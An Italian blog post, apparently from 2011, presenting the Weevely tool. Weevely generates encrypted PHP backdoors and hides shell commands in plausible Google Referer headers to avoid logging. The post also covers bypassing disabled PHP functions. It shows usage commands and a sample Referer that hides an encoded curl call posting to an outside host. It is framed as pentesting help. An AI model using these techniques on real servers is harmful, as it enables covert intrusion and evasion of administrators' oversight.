@@ -1,0 +1,103 @@
+Date: 2011-01-15 03:33:52
+Author: evilsocket
+Categories: Exploiting, Hacking, Programmazione, Python, Tools, Web Hacking
+Tags: 
+Title: Weevely: PHP backdoor-ing and security bypass.
+
+<h3>Situazione:</h3>
+Ci troviamo a dover eseguire un pen test 'black box' (quindi dall'esterno) per un nostro cliente, arriviamo ad un suo portale aziendale ed in qualche modo riusciamo ad eseguire dei comandi arbitrari sul server (<a href="http://r00tsecurity.org/forums/topic/2223-log-poisoning/" target="_blank">lfi + log poisoning</a>, <a href="http://www.evilsocket.net/1245/tecniche-avanzate-di-sql-injection-quello-che-non-tutti-sanno.html" target="_blank">sqli + scrittura su file</a>, ecc), nel 90% dei casi ci troviamo di fronte ad (almeno) i seguenti problemi:
+<ol>
+	<li>L'output dei comandi sarà quasi sempre misto al normale html del portale, quindi non immediato da leggere.</li>
+	<li>Non sarà possibile eseguire determinate operazioni a causa dell'hardening del php o cmq di eventuali sistemi di sicurezza nel server.</li>
+	<li>Sarà cmq un metodo invasivo (e visibile tramite log, nel caso in cui non fosse proprio un NOSTRO cliente :P).</li>
+	<li>Eventuali backdoor che potremmo lasciare sarebbero visibili ed utilizzabili da tutti (quindi anche da gente che poco c'entra con il nostro test).</li>
+</ol>
+<break>
+
+Per ovviare a tutti questi problemi (ed a tanti altri!) esiste <strong>weevely</strong>, un applicazione python di produzione nostrana realizzata da <a href="http://thissecting.wordpress.com/" target="_blank">Emilio Pinna</a> la quale offre le seguenti funzionalità:
+<ul>
+	<li>Generare una backdoor PHP <strong>cifrata</strong> dinamicamente.</li>
+	<li>Eseguire comandi sulla shell remota, <strong>offuscando le richieste </strong>dentro HTTP_REFERER plausibili.</li>
+	<li>Simulare un <strong>terminale</strong> per inviare comandi alla shell remota.</li>
+	<li><strong>Eludere</strong> alcune configurazioni di PHP che limitano l’esecuzione di comandi sul sistema.</li>
+	<li><strong>Eseguire</strong> moduli sulla macchina remota per automatizzare compiti.</li>
+	<li>Aggiungere nuovi <strong>moduli</strong> in maniera facile e veloce.</li>
+</ul>
+Analiziamo i vari punti per capire esattamente di cosa si tratta e come utilizzarla.
+<h3>Generare una backdoor PHP cifrata dinamicamente.</h3>
+Il compito basilare di weevely è generare un file php che potrà essere usato singolarmente come backdoor oppure il cui codice potrà essere inserito in una pagina già esistente per non creare nuovi file.
+
+La backdoor di uscita sarà un file php protetto da una password scelta dall'utente, solo tramite questa password sarà possibile capirne il contenuto ed eseguire comandi sul server tramite essa.
+
+Per generare la backdoor 'prova.php' protetta da password 'foobar', la linea di comando sarà:
+<blockquote>weevely -g -o prova.php -p foobar</blockquote>
+<h3>Eseguire comandi sulla shell remota, offuscando le richieste dentro HTTP_REFERER plausibili.</h3>
+Il nostro problema numero 3, ha evidenziato che qualsiasi richiesta noi possiamo fare per eseguire un comando tramite una vulnerabilità di un applicazione web, sarà naturalmente loggata dal demone http e facilmente tracciabile da un sysadmin (minimamente) accorto.
+
+Weevely ovvia a questo problema in in tre modi diversi.
+
+Prima di tutto cripta le richieste in base alla password impostata per la backdoor, quindi di fatto nessun tipo di dato in chiaro verrà loggato.
+
+Secondo, piùttosto che utilizzare variabili GET o POST per incapsulare i comandi, weevely utilizza il campo <strong>Referer</strong> dell'header http, campo che nel 99% dei casi non viene loggato dal demone http.
+
+Terzo, ogni richiesta incapsulata in un referer, viene impostata per essere plausibile ed irriconoscibile da un normale referer di un qualsiasi utente ... come?
+
+Questa è una normale ed innoqua richiesta HTTP di un utente che proviene da Google:
+<blockquote><strong>GET</strong> /index.php <strong>HTTP</strong>/<strong>1.1</strong>
+<strong>Referer</strong>: http://www.google.com/url?sa=t&amp;source=web&amp;ct=res&amp;cd=7&amp;url=http%3A%2F%2Fwww.target.com%2Findex.php&amp;ei=0SjdSa-1N5O8M_qW8dQN&amp;rct=j&amp;q=index&amp;usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&amp;sig2=X8uCFh6IoPtnwmvGMULQfw</blockquote>
+Questa invece è una richiesta di weevely mascherata nel referer:
+<blockquote><strong>GET</strong> /index.php <strong>HTTP</strong>/<strong>1.1</strong>
+<strong>Referer</strong>: http://www.google.com/url?sa=pa&amp;source=web&amp;ct=7&amp;url=http%3A%2F%2Fwww.target.com%2F&amp;rct=j&amp;q=target&amp;ei=QHN5c3RlbSgnY3
+VybCAtdSB1c2VybmFtZTpwYXNzd29yZ&amp;usg=CAtZCBzdGF0dXM9IlBXTkVEISIgaHR0cHM6Ly90d2l0dG
+&amp;sig2=VyLmNvbS9zdGF0dXNlcy91cGRhdGUueG1sIDI+JjEnKTs=</blockquote>
+Siate onesti ... voi sapreste determinare ad occhio nudo che la seconda è in realtà tutt'altro che una richiesta innoqua, magari trovandovi di fronte centinaia di righe di log http analoghi? Io sinceramente no :)
+<h3>Simulare un terminale per inviare comandi alla shell remota.</h3>
+Utilizzando il flag '-t', ad esempio:
+<blockquote>weevely -t -u "http://localhost/" -p foobar</blockquote>
+Si ha accesso ad una comodissima simulazione di un terminale sul server remoto ... il risultato ?
+<blockquote>
+<div id="_mcePaste"><span style="color: #999999;">[evilsocket@backbox ~]</span> weevely -t -u "http://localhost/" -p foobar</div>
+<div id="_mcePaste"><span style="color: #999999;">...</span></div>
+<div id="_mcePaste"><span style="color: #999999;">+ Using method 0 [system()] on http://localhost/</span></div>
+<div id="_mcePaste"><span style="color: #999999;">localhost</span>&gt; ls -l /</div>
+<div id="_mcePaste">total 176444</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root      4096 Jan  5 09:08 bin</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root         1 Dec 15  2004 boot</div>
+<div id="_mcePaste">drwxr-xr-x   4 root root      4096 Jun 25  2009 dev</div>
+<div id="_mcePaste">drwxr-xr-x  69 root root      8192 Jan  5 09:11 etc</div>
+<div id="_mcePaste">drwxr-xr-x 177 root root      4096 Jan  4 17:23 home</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root         1 Jan 12  2007 initrd</div>
+<div id="_mcePaste">drwxr-xr-x  10 root root      8192 Jan  5 09:07 lib</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root         1 Jan 12  2007 media</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root         1 Dec 15  2004 mnt</div>
+<div id="_mcePaste">drwxr-xr-x   4 root root        16 Apr 29  2008 opt</div>
+<div id="_mcePaste">dr-xr-xr-x 161 root root         0 May 18  2010 proc</div>
+<div id="_mcePaste">drwxr-xr-x   9 root root     16384 Jan  5 08:55 root</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root      4096 Jan  5 09:07 sbin</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root         1 Sep 16  2008 selinux</div>
+<div id="_mcePaste">drwxr-xr-x   2 root root         1 Jan 12  2007 srv</div>
+<div id="_mcePaste">drwxr-xr-x  11 root root         0 May 18  2010 sys</div>
+<div id="_mcePaste">drwxrwxrwt  10 root root 179748864 Jan 15 03:23 tmp</div>
+<div id="_mcePaste">drwxr-xr-x  12 root root        80 May 24  2007 usr</div>
+<div id="_mcePaste">drwxr-xr-x  15 root root      4096 Mar 15  2007 var</div></blockquote>
+Decisamente più comodo che eseguire comandi tramite browser no? :)
+
+Aggiungo inoltre una piccola nota, nell'ultimo commit svn eseguito dal sottoscritto (si sto dando un piccolo contrinuto a questo splendido progetto), weevely presenta lo storico dei comandi (salvato in un file nella home dell'utente) richiamabile tramite le frecce della tastiera nonchè l'auto completamento degli stessi tramite tab :)
+<h3><strong>Eludere</strong> alcune configurazioni di PHP che limitano l’esecuzione di comandi sul sistema.</h3>
+L’interprete PHP può essere configurato per non eseguire deteterminate funzioni pericolose, ad esempio quelle che eseguono comandi o in generale interagiscono col filesystem. Per eludere questa protezione Weevely supporta 8 funzioni diverse, utilizzabili nel caso qualcuna sia stata disabilitate per proteggere il server. La scelta della funzione adatta viene fatta automaticamente, ma se desideriamo possiamo stampare le funzioni disponibili con l’opzione -s:
+<blockquote><span style="color: #999999;">[evilsocket@backbox ~]</span> weevely -s -u http://localhost/ -p foobar
+
++ Accepted functions: 0 [system()] 1 [passthru()] 2 [popen()] 3 [exec()] 4 [proc_open()] 5 [shell_exec()]
+
+- Unsupported functions: 7 [perl-&gt;system()] 8 [python_eval()] 6 [pcntl_exec()]</blockquote>
+Se necessario si può richiamare una funzione a nostra scelta con l’opzione -e.
+
+Comunque anche utilizzando Weevely senza opzioni aggiuntive, verrà scelta automaticamente una funzione tra quelle abilitate.
+<h3><strong>Eseguire</strong> moduli sulla macchina remota per automatizzare compiti.</h3>
+E possibile caricare moduli on-the-fly per aumentare le funzionalità della backdoor o automatizzare alcuni compiti. Informazioni dettagliate sui moduli disponibili sono visualizzate con il comando -l. L’opzione -m esegue invece il modulo specificato, se viene chiamata con il nome del modulo seguito dagli eventuali parametri richiesti, ad esempio -m modulo::parametro1::parametro2::parametro3.
+
+In finale, un ottimo tools, semplice ma egregiamente realizzato ed estremamente utile in tantissime circostanze.
+
+Vi rimando alla <a href="http://code.google.com/p/weevely/" target="_blank">pagina del progetto</a>, al <a href="http://thissecting.wordpress.com/" target="_blank">blog</a> dell'autore e ricordo che <strong><a href="http://www.evilsocket.net/tag/backbox" target="_blank">BackBox Linux</a></strong> include già weevely pacchettizzato all'ultima versione :)
+
+Enjoy
